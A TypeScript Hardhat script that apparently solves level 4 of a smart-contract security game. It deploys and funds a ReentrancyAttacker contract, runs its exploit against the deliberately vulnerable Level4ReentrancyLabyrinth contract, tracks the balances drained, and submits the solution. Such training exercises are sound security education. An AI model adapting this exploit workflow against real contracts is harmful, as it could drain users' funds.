// scripts/solve-level4.ts
// Run with: npx hardhat run scripts/solve-level4.ts --network monad

import hre from "hardhat";
import { getAddress, parseEther, Address } from "viem";
import fs from 'fs';
import path from 'path';
import dotenv from 'dotenv';
dotenv.config();

// Interface for contract addresses
interface ContractAddresses {
  Level4ReentrancyLabyrinth?: string;
  BlockchainGuardianGame?: string;
  ReentrancyAttacker?: string;
  [key: string]: string | undefined;
}

// Helper function to ensure addresses are properly formatted
function formatAddress(address: string): Address {
  return getAddress(address) as Address;
}

async function main() {
  try {
    console.log("🔐 BLOCKCHAIN GUARDIAN: LEVEL 4 REENTRANCY LABYRINTH 🔐");
    console.log("=========================================================");
    
    // Import contract addresses
    const deploymentPath = path.join(__dirname, '../deployed-addresses.json');
    let contractAddresses: ContractAddresses = {};
    
    if (fs.existsSync(deploymentPath)) {
      try {
        const deploymentData = fs.readFileSync(deploymentPath, 'utf8');
        contractAddresses = JSON.parse(deploymentData);
        console.log("Loaded addresses from deployment-addresses.json");
      } catch (error) {
        console.warn("Could not parse deployment-addresses.json, will try frontend config or env variables.");
      }
    }
    
    // If not found in deployment file, try frontend config
    if (!contractAddresses.Level4ReentrancyLabyrinth || !contractAddresses.BlockchainGuardianGame) {
      try {
        // @ts-ignore
        const addressesModule = await import('../frontend/src/config/addresses.js');
        const frontendAddresses = addressesModule.contractAddresses || {};
        
        // Only use frontend addresses for missing values
        if (!contractAddresses.Level4ReentrancyLabyrinth) {
          contractAddresses.Level4ReentrancyLabyrinth = frontendAddresses.Level4ReentrancyLabyrinth;
        }
        
        if (!contractAddresses.BlockchainGuardianGame) {
          contractAddresses.BlockchainGuardianGame = frontendAddresses.BlockchainGuardianGame;
        }
        
        console.log("Loaded missing addresses from frontend config");
      } catch (error) {
        console.warn("Could not import contract addresses from frontend config.");
      }
    }
    
    // Get wallet and public client
    const [wallet] = await hre.viem.getWalletClients();
    const walletAddress = wallet.account.address;
    const publicClient = await hre.viem.getPublicClient();
    
    console.log(`Using account: ${getAddress(walletAddress)}`);
    
    // Check balance
    const balance = await publicClient.getBalance({
      address: getAddress(walletAddress)
    });
    console.log(`Account balance: ${balance / BigInt(10**18)} MONAD`);
    
    // Get contract addresses from env variables if not found earlier
    const LEVEL4_CONTRACT_ADDRESS = process.env.LEVEL4_CONTRACT_ADDRESS || 
                                  contractAddresses.Level4ReentrancyLabyrinth;
    const GAME_CONTRACT_ADDRESS = process.env.GAME_CONTRACT_ADDRESS || 
                                contractAddresses.BlockchainGuardianGame;
    const ATTACKER_CONTRACT_ADDRESS = process.env.ATTACKER_CONTRACT_ADDRESS || 
                                    contractAddresses.ReentrancyAttacker;
    
    if (!LEVEL4_CONTRACT_ADDRESS) {
      throw new Error("Level4 contract address not found. Please set LEVEL4_CONTRACT_ADDRESS env variable.");
    }
    
    if (!GAME_CONTRACT_ADDRESS) {
      throw new Error("Game contract address not found. Please set GAME_CONTRACT_ADDRESS env variable.");
    }
    
    console.log(`Level4 Contract: ${LEVEL4_CONTRACT_ADDRESS}`);
    console.log(`Game Contract: ${GAME_CONTRACT_ADDRESS}`);
    
    // Format addresses to ensure they're valid Ethereum addresses
    const level4Address = formatAddress(LEVEL4_CONTRACT_ADDRESS);
    const gameAddress = formatAddress(GAME_CONTRACT_ADDRESS);
    
    // Get contract instances
    const gameContract = await hre.viem.getContractAt("BlockchainGuardianGame", gameAddress);
    const level4Contract = await hre.viem.getContractAt("Level4ReentrancyLabyrinth", level4Address);
    
    // Check current player level
    const initialLevel = await gameContract.read.playerLevel([getAddress(walletAddress)]);
    console.log(`Current player level: ${Number(initialLevel)}`);
    
    if (Number(initialLevel) >= 4) {
      console.log("You've already completed Level 4!");
      return;
    }
    
    // Get attacker contract
    let attackerContract;
    let attackerAddress: Address;
    
    if (ATTACKER_CONTRACT_ADDRESS) {
      console.log(`\nUsing already deployed ReentrancyAttacker at: ${ATTACKER_CONTRACT_ADDRESS}`);
      attackerAddress = formatAddress(ATTACKER_CONTRACT_ADDRESS);
      attackerContract = await hre.viem.getContractAt("ReentrancyAttacker", attackerAddress);
    } else {
      // Deploy new attacker contract if address not provided
      console.log("\nDeploying new ReentrancyAttacker contract...");
      
      // Make sure the contract is compiled
      await hre.run('compile');
      
      // Deploy the contract
      attackerContract = await hre.viem.deployContract("ReentrancyAttacker", [level4Address]);
      attackerAddress = attackerContract.address;
      console.log(`ReentrancyAttacker deployed to: ${attackerAddress}`);
      
      // Save the address
      contractAddresses.ReentrancyAttacker = attackerAddress;
      fs.writeFileSync(deploymentPath, JSON.stringify(contractAddresses, null, 2));
    }
    
    // Add this check right after getting the attacker contract
    console.log("\nVerifying contract code...");
    const code = await publicClient.getBytecode({
      address: attackerAddress
    });

    if (!code || code === '0x') {
      throw new Error("No contract code found at the specified address. Contract may not be deployed correctly.");
    }
    
    // Get contract instances
    const attackerContractInstance = await hre.viem.getContractAt("ReentrancyAttacker", attackerAddress);

    // Check initial balances
    console.log("\nInitial balances:");
    console.log(`Attacker contract: ${await publicClient.getBalance({
      address: attackerAddress
    })} wei`);
    console.log(`Target contract: ${await publicClient.getBalance({
      address: level4Address
    })} wei`);

    // Setup the attack by sending funds
    console.log("\nSetting up the attack...");
    const attackAmount = 100000000000000000n; // 0.1 ETH
    const setupHash = await attackerContractInstance.write.setup([], {
      value: attackAmount
    });
    console.log(`Setup transaction hash: ${setupHash}`);    
    await publicClient.waitForTransactionReceipt({ hash: setupHash });
    console.log("Attack setup completed");

    // Check balances after setup
    console.log("\nBalances after setup:");
    console.log(`Attacker contract: ${await publicClient.getBalance({
      address: attackerAddress
    })} wei`);
    console.log(`Target contract: ${await publicClient.getBalance({
      address: level4Address
    })} wei`);

    // Execute the exploit
    console.log("\nExecuting the reentrancy exploit...");
    const exploitHash = await attackerContractInstance.write.exploit();
    await publicClient.waitForTransactionReceipt({ hash: exploitHash });
    console.log("Exploit executed successfully");

    // Check final balances
    console.log("\nFinal balances:");
    console.log(`Attacker contract: ${await publicClient.getBalance({
      address: attackerAddress
    })} wei`);
    console.log(`Target contract: ${await publicClient.getBalance({
      address: level4Address
    })} wei`);

    // Verify the exploit
    console.log("\nVerifying the exploit with the contract...");
    try {
      const checkExploitHash = await level4Contract.write.checkExploit([attackerAddress]);
      await publicClient.waitForTransactionReceipt({ hash: checkExploitHash });
      
      // Check if the exploit was successful
      const exploitSuccessful = await level4Contract.read.exploitSuccessful();
      console.log(`Exploit successful: ${exploitSuccessful}`);
      
      if (exploitSuccessful) {
        // Make a deposit to validate the secure withdrawal
        console.log("\nMaking a deposit to test secure withdrawal...");
        const depositHash = await level4Contract.write.deposit([], {
          value: parseEther("0.1") // Deposit 0.1 ETH
        });
        await publicClient.waitForTransactionReceipt({ hash: depositHash });
        
        // Validate the solution
        console.log("\nValidating the solution...");
        const validateHash = await level4Contract.write.validateSolution();
        await publicClient.waitForTransactionReceipt({ hash: validateHash });
        
        // Check if level completed
        const finalLevel = await gameContract.read.playerLevel([getAddress(walletAddress)]);
        if (Number(finalLevel) > Number(initialLevel)) {
          console.log("\n🎮 LEVEL 4 COMPLETED SUCCESSFULLY! 🎮");
        } else {
          console.log("\n❌ Level not completed. Please check your solution.");
        }
      } else {
        console.log("\n❌ Exploit verification failed.");
      }
    } catch (error: any) {
      console.error("\n❌ Error during exploit verification:", error.message);
      if (error.reason) console.error(`Reason: ${error.reason}`);
    }
  } catch (error: any) {
    console.error(`\n❌ Script failed: ${error.message}`);
    if (error.reason) console.error(`Reason: ${error.reason}`);
    process.exit(1);
  }
}

// Execute the main function
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });